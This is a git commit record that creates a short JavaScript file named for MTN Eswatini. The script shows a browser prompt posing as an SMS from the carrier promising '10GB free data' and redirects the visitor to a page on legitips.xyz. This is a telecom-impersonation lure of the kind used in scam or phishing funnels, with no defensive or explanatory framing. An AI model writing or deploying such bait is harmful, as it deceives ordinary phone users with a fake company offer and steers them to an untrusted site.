c41edd440f2e98af8590bd97f48f7ed3df0946e9
legitips <83867893+legitips@users.noreply.github.com>
2024-08-27 00:01:26 -0700

    Create activation-mtn-eswatini.js

---
+++ activation-mtn-eswatini.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS: We are sorry for the inconvenience and we are giving out 10GB free data, press 1 to Activate now ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/mtn-eswatini.html';
+}
